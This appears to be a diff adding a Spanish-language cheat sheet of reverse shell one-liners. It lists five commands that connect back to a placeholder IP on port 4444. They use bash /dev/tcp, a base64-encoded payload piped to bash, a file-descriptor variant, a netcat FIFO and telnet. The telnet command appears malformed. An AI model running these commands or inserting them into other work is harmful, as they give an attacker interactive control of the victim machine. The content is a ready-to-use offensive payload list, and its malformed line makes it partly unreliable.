@@ -1,0 +1,14 @@
+▶ Reverse Shell Básica (Conectar con /dev/tcp):
+  bash -i >& /dev/tcp/$IP/4444 0>&1
+
+▶ Reverse Shell Codificada en Base64 (Ejecutar codificada):
+  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8kSVAvNDQ0NCAwPiYx" | base64 -d | bash
+
+▶ Reverse Shell con /dev/tcp (Usar descriptor de archivo):
+  0<&196;exec 196<>/dev/tcp/$IP/4444; sh <&196 >&196 2>&196
+
+▶ Reverse Shell con Netcat (Usar FIFO y nc):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f
+
+▶ Reverse Shell con Telnet (Usar pipe y telnet):
+  rm -f /tmp/p; mknod /tmp/p p && telnet $IP 4444 0/tmp/p
